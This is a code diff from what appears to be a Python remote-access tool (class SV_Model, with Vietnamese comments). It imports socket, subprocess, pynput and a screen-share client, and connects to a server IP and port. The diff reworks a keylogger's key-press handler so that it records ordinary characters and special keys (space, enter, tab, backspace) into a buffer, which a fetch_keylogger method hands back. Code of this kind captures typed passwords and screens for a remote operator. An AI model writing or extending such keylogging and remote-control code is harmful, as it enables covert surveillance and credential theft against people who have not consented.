@@ -1,13 +1,10 @@
-
 import json
 import os
 import socket
 import subprocess
 import threading
-import time
 from pynput import keyboard
 from vidstream import ScreenShareClient
-from queue import Queue
 
 class SV_Model:
     def __init__(self, server_ip, server_port):
@@ -233,17 +230,23 @@ class SV_Model:
     def on_press(self, key):
         """Xử lý khi một phím được nhấn."""
         try:
-            if hasattr(key, 'char') and key.char:
-                # Thêm phím nhấn vào buffer nếu là ký tự bình thường
-                self.keys_buffer += key.char
-            elif key == keyboard.Key.enter:
-                # Nếu phím Enter được nhấn, lưu buffer hiện tại và tạo dòng mới
-                self.keys_buffer += " [ENTER] "
-                self.process_buffer()  # Xử lý buffer hiện tại, ví dụ như in ra hoặc lưu vào nơi khác
-                self.keys_buffer = ""  # Reset buffer sau khi Enter
+            # Dictionary chứa các phím đặc biệt và cách hiển thị của chúng
+            special_keys = {
+                keyboard.Key.space: " ",
+                keyboard.Key.enter: " [ENTER] ",
+                keyboard.Key.tab: " [TAB] ",
+                keyboard.Key.backspace: " [BACKSPACE] ",
+            }
+            # Kiểm tra nếu phím là ký tự bình thường
+            if hasattr(key, 'char') and key.char is not None:
+                key_str = key.char  # Lấy ký tự từ phím nhấn
+            else:
+                # Kiểm tra xem phím đặc biệt có trong dictionary không
+                key_str = special_keys.get(key, f'[{str(key)}]')  # Tra cứu phím đặc biệt trong dictionary
+
+            self.keys_buffer += key_str  # Thêm vào buffer
         except AttributeError:
-            # Xử lý các phím đặc biệt khác nếu cần
-            pass
+            pass  # Nếu gặp lỗi (ví dụ: không phải phím có thuộc tính 'char'), bỏ qua
 
     def fetch_keylogger(self):
         """Trả về các phím đã ghi lại từ bộ đệm."""
